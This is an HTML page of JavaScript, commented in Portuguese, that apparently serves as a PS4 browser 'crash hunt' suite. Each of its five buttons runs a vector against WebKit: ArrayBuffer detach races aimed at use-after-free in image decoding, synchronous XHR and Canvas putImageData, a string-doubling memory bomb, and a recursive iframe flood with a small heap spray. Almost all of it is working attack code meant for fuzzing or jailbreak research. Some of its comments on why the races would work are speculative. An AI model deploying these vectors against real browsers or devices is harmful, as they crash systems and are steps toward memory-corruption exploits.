<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v500000: Crash Hunt</title>
<style>
    body { background: #000; color: #f0f; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #f0f; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #202; color: #fff; font-weight: bold;
    }
    
    button {
        display: block; width: 100%; padding: 20px; margin: 10px 0;
        background: #303; color: #fff; border: 2px solid #f0f;
        font-size: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #f0f; color: #000; }
    
    #stage { background: #111; height: 50px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v500000: CRASH HUNT</h1>

<div class="status" id="msg">
    ESTRATÉGIA: DETACH RACE EM APIS NATIVAS (NO WEBGL)<br>
    CLIQUE -> FULLSCREEN -> SIGA INSTRUÇÃO
</div>

<button onclick="crash_hunt(c01)">01. Image Decode UAF (Blob Race)</button>

<button onclick="crash_hunt(c02)">02. Sync XHR Buffer Detach</button>

<button onclick="crash_hunt(c03)">03. Canvas 2D PutData Race</button>

<button onclick="crash_hunt(c04)">04. String Alloc Bomb (OOM Crash)</button>

<button onclick="crash_hunt(c05)">05. Recursive Iframe Flood</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    const Msg = document.getElementById('msg');
    
    // Worker para desanexar memória (Detach)
    const workerBlob = new Blob(["onmessage=function(e){ postMessage('done'); }"], {type:'text/javascript'});
    const workerUrl = URL.createObjectURL(workerBlob);

    // Armazém de spray
    let spray_store = [];

    function crash_hunt(vectorFunc) {
        Stage.innerHTML = "";
        spray_store = [];
        
        // 1. Configura
        const target = vectorFunc(Stage);
        
        // 2. Fullscreen
        if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        else if (target.requestFullscreen) target.requestFullscreen();

        // 3. Execução
        requestAnimationFrame(() => {
            setTimeout(() => {
                if(target._exec) target._exec();
            }, 500);
        });
    }

    // =================================================================
    // 01. Image Decode UAF (Blob Race)
    // Cria uma imagem a partir de um buffer, começa a carregar,
    // e remove a memória do buffer instantaneamente.
    // O decodificador de imagem tenta ler memória vazia.
    // =================================================================
    function c01(stage) {
        const d = document.createElement('div');
        d.innerText = "IMG RACE";
        stage.appendChild(d);

        const w = new Worker(workerUrl);
        const buffer = new ArrayBuffer(1024 * 1024 * 5); // 5MB
        const view = new Uint8Array(buffer);
        // Preenche com cabeçalho fake de JPG/PNG para enganar o parser
        view.fill(0xFF); 

        const blob = new Blob([view], {type: 'image/jpeg'});
        const url = URL.createObjectURL(blob);
        const img = new Image();

        d._exec = () => {
            Msg.innerText = ">>> CLIQUE OK <<<";
            
            // 1. Inicia o carregamento (Decodificação)
            img.src = url;
            
            // 2. Transfere a memória do buffer fonte para o Worker (Detach)
            w.postMessage(buffer, [buffer]);
            
            // 3. PAUSA
            window.alert("⚠️ IMAGE MEMORY KILLED ⚠️\nO decodificador está tentando ler o buffer.\nClique OK.");
            
            // 4. Se não crashou, tenta forçar o render da imagem quebrada
            stage.appendChild(img);
        };
        return d;
    }

    // =================================================================
    // 02. Sync XHR Buffer Detach
    // Requisições Síncronas (Sync XHR) travam a thread principal.
    // Se enviarmos um buffer e desanexarmos ele, podemos corromper a pilha de rede.
    // =================================================================
    function c02(stage) {
        const d = document.createElement('div');
        d.innerText = "SYNC XHR RACE";
        stage.appendChild(d);

        const w = new Worker(workerUrl);
        const buffer = new ArrayBuffer(1024 * 1024 * 2); // 2MB
        const view = new Uint8Array(buffer);
        view.fill(0x41);

        d._exec = () => {
            Msg.innerText = ">>> CLIQUE OK <<<";
            
            const xhr = new XMLHttpRequest();
            // FALSE = Síncrono (Trava tudo)
            xhr.open("POST", "/fake_endpoint", false); 
            
            // PREPARAÇÃO: O golpe acontece na chamada .send()
            // Como é síncrono, não podemos rodar código DEPOIS do send() imediatamente.
            // Precisamos agendar o detach para "agora mesmo" via Worker ou Timeout
            
            // Truque: Desanexar o buffer assim que o alerta fechar,
            // mas tentar usar o buffer dentro do XHR.
            
            window.alert("⚠️ SYNC LOCK ⚠️\nAo clicar OK, o XHR vai tentar ler memória.");
            
            try {
                // Tenta enviar. Se conseguirmos invalidar 'view' aqui...
                // (Difícil em JS puro síncrono, mas vamos tentar o UAF reverso)
                // Transferimos ANTES e enviamos DEPOIS.
                w.postMessage(buffer, [buffer]);
                
                // Agora 'view' é comprimento 0 (inválido).
                // O XHR vai aceitar? Se ele tentar ler ponteiro antigo -> CRASH.
                xhr.send(view); 
            } catch(e) {
                d.innerText = "Erro JS: " + e.message;
            }
        };
        return d;
    }

    // =================================================================
    // 03. Canvas 2D PutData Race
    // WebGL falhou, mas Canvas 2D usa a CPU/GPU também.
    // putImageData copia memória do JS para o Canvas.
    // =================================================================
    function c03(stage) {
        const d = document.createElement('div');
        d.innerText = "CANVAS 2D RACE";
        stage.appendChild(d);

        const canvas = document.createElement('canvas');
        canvas.width = 1000; canvas.height = 1000;
        const ctx = canvas.getContext('2d');
        stage.appendChild(canvas);

        const w = new Worker(workerUrl);
        // Cria um ImageData apontando para um buffer
        const buffer = new ArrayBuffer(1000 * 1000 * 4);
        const clamped = new Uint8ClampedArray(buffer);
        const imgData = new ImageData(clamped, 1000, 1000);

        d._exec = () => {
            Msg.innerText = ">>> CLIQUE OK <<<";
            
            // 1. Detach do buffer fonte
            w.postMessage(buffer, [buffer]);
            
            // 2. PAUSA
            window.alert("⚠️ PIXELS DETACHED ⚠️\nO Canvas vai tentar desenhar memória morta.");
            
            // 3. Tenta desenhar o ImageData (cujo buffer agora é tamanho 0)
            try {
                ctx.putImageData(imgData, 0, 0);
            } catch(e) {
                // Se der erro, tenta spray
                spray_store.push(new Uint32Array(10000).fill(0x1337));
            }
        };
        return d;
    }

    // =================================================================
    // 04. String Alloc Bomb (OOM Crash)
    // Tenta alocar strings tão grandes durante a pausa do alerta que
    // corrompe o alocador de memória do WebKit.
    // =================================================================
    function c04(stage) {
        const d = document.createElement('div');
        d.innerText = "STRING BOMB";
        stage.appendChild(d);

        let s = "A";
        // Cria string de 10MB
        for(let i=0; i<23; i++) s += s; 

        d._exec = () => {
            Msg.innerText = ">>> CLIQUE OK VÁRIAS VEZES <<<";
            
            function loop() {
                // Dobra o tamanho a cada alerta
                // Chega a gigabytes rapidamente
                s += s;
                
                // O Alerta segura a referência na memória da UI
                window.alert("⚠️ STRING SIZE: " + s.length + " ⚠️\nO sistema está segurando essa string na RAM.");
                
                // Se sobreviver, continua
                requestAnimationFrame(loop);
            }
            loop();
        };
        return d;
    }

    // =================================================================
    // 05. Recursive Iframe Flood
    // Cria iframes infinitamente dentro de iframes.
    // Estoura a Stack do navegador.
    // =================================================================
    function c05(stage) {
        const d = document.createElement('div');
        d.innerText = "IFRAME FLOOD";
        stage.appendChild(d);

        d._exec = () => {
            let count = 0;
            function addIframe(parent) {
                count++;
                if(count > 1000) return; // Limite de segurança JS
                
                const f = document.createElement('iframe');
                parent.appendChild(f);
                
                // A cada 50 iframes, pausa para o sistema respirar (e travar)
                if(count % 50 === 0) {
                     window.alert("⚠️ IFRAMES: " + count + " ⚠️\nA pilha de renderização está cheia.");
                }
                
                // Recursão
                try {
                    addIframe(f.contentDocument.body);
                } catch(e) {}
            }
            addIframe(document.body);
        };
        return d;
    }

</script>
</body>
</html>
